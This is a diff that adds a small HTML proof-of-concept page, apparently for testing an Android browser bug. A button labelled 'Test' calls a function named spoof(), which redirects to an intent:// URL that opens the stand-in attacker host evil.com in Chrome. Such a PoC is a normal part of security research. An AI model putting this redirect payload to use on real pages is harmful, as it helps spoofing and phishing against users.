@@ -1,0 +1,15 @@
+<style>
+    .button {
+        position: fixed;
+        top: 60%;
+        right: 20%;
+    }
+</style>
+
+<button class="button" onclick="spoof()">Test</button>
+
+<script>
+function spoof(){
+    location.href = 'intent://evil.com/#Intent;scheme=https;package=com.android.chrome;end'
+}
+</script>
